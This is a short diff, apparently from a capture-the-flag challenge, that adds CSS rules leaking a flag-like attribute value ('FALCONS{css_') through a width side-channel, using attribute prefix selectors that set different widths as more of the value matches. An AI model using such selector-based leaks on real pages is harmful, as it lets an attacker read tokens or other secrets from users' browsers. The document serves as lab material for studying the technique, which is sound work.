@@ -1,0 +1,5 @@
+/* Leak part 2 via width side-channel */
+#leak[data-p2^="FA"]{ width:101px }
+#leak[data-p2^="FALC"]{ width:102px }
+#leak[data-p2^="FALCON"]{ width:103px }
+#leak[data-p2="FALCONS{css_"]{ width:104px }
